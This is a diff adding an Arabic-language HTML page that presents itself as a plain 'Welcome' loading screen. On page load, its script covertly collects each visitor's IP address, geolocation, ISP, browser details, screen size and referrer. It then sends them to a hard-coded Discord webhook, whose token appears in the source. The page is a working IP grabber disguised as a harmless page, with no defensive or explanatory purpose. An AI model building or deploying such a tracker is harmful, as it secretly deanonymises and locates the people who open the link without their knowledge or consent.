@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Welcome</title>
+<style>
+  body {
+    margin: 0;
+    font-family: system-ui, -apple-system, sans-serif;
+    background: #0d1117;
+    color: #e6edf3;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+  }
+  .card {
+    background: #161b22;
+    border: 1px solid #30363d;
+    border-radius: 12px;
+    padding: 40px 50px;
+    text-align: center;
+    max-width: 400px;
+  }
+  h1 { font-size: 20px; margin: 0 0 8px; }
+  p { color: #8b949e; font-size: 14px; margin: 0; }
+</style>
+</head>
+<body>
+  <div class="card">
+    <h1>Welcome</h1>
+    <p>Loading...</p>
+  </div>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1522224948750319778/Z1Z3rlug1uk3-G8_ahQVNwXD4NvVoHTy9qIezgPYotFqYcNS2xzZws-EALX3gl6F0OUn";
+
+// جلب كل بيانات الزائر
+async function getVisitorData() {
+  let ipData = {};
+
+  // IP + geo من ipapi.co (مجاني بدون مفتاح)
+  try {
+    const r = await fetch("https://ipapi.co/json/");
+    ipData = await r.json();
+  } catch (e) {
+    // fallback: بس الـ IP الخام
+    try {
+      const r2 = await fetch("https://api.ipify.org?format=json");
+      ipData = await r2.json();
+    } catch (_) {}
+  }
+
+  return {
+    ip:         ipData.ip          || "unknown",
+    city:       ipData.city        || "unknown",
+    region:     ipData.region      || "unknown",
+    country:    ipData.country_name|| "unknown",
+    isp:        ipData.org         || "unknown",
+    timezone:   ipData.timezone    || "unknown",
+    ua:         navigator.userAgent,
+    platform:   navigator.platform,
+    language:   navigator.language,
+    screen:     `${screen.width}x${screen.height}`,
+    referrer:   document.referrer || "direct",
+    page:       location.href,
+    time:       new Date().toISOString()
+  };
+}
+
+// إرسال للديسكورد
+async function sendToDiscord(data) {
+  const embed = {
+    title: "زيارة جديدة",
+    color: 0x5865f2,
+    fields: [
+      { name: "IP",        value: data.ip,       inline: true },
+      { name: "Country",   value: data.country,  inline: true },
+      { name: "City",      value: `${data.city}, ${data.region}`, inline: false },
+      { name: "ISP",       value: data.isp,      inline: false },
+      { name: "Timezone",  value: data.timezone, inline: true },
+      { name: "Language",  value: data.language, inline: true },
+      { name: "Screen",    value: data.screen,   inline: true },
+      { name: "Referrer",  value: data.referrer, inline: false },
+      { name: "User-Agent",value: `\`\`\`${data.ua}\`\`\`` }
+    ],
+    timestamp: data.time,
+    footer: { text: "visitor tracker" }
+  };
+
+  await fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      username: "Visitor Log",
+      embeds: [embed]
+    })
+  });
+}
+
+(async () => {
+  const data = await getVisitorData();
+  await sendToDiscord(data);
+  document.querySelector("p").textContent = "Welcome.";
+})();
+</script>
+</body>
+</html>
